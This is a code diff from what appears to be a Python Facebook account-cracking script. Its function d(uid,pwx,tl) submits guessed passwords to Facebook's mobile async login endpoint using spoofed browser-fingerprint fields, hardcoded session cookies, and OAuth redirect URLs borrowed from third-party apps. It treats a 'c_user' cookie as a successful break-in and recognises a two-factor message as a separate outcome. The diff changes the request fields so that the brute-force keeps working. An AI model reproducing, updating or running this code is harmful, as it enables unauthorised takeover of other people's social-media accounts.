@@ -1742,19 +1742,17 @@ def d(uid,pwx,tl):
             'first_prefill_type': '',
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'false',
-            'is_smart_lock': 'false',
+            'is_smart_lock': 'true',
             'bi_xrwh': '0',
-            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wndtoStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'fb_dtsg': '',
+            'pass': pw,
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'dyn': '',
             'csr': '',
             'req': '3',
-            'fmt': '1',
             'a': '',
-            'user': '0'}
+            '__user': '0',
+            '_fb_noscript': 'true',}
             cookies = {
             'datr': 'QtBZZ5pdw9yXQJE0ZygUaI3n',
             'sb': 'QtBZZwQbIwtJ9ikr_rQjmuJI',
@@ -1785,7 +1783,7 @@ def d(uid,pwx,tl):
             "accept-encoding": "gzip, deflate, br",
             "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://m.facebook.com/login/device-based/login/async/?api_key=124024574287414&auth_token=07adf4ea7b64b7deeea58b93cba0a1e3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%252217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De5428d80-85a0-4de8-9e72-860dccbb218a%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100'
+            url = 'https://m.facebook.com/login/device-based/login/async/?api_key=919333506109325&auth_token=070a3822c521abc19dd8d460c75f70aa&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Ftype%3Dweb_server%26client_id%3D919333506109325%26redirect_uri%3Dhttps%253A%252F%252Fskylum.com%252Fuser%252Flogin%252Fservice%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3Dd19e912e05544fb2c05ca0b26f189652%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dab43f793-a215-46f5-97fe-d700ff6d1e9e%26tp%3Dunspecified&refsrc=deprecated&app_id=919333506109325&cancel=https%3A%2F%2Fskylum.com%2Fuser%2Flogin%2Fservice%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dd19e912e05544fb2c05ca0b26f189652%23_%3D_&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
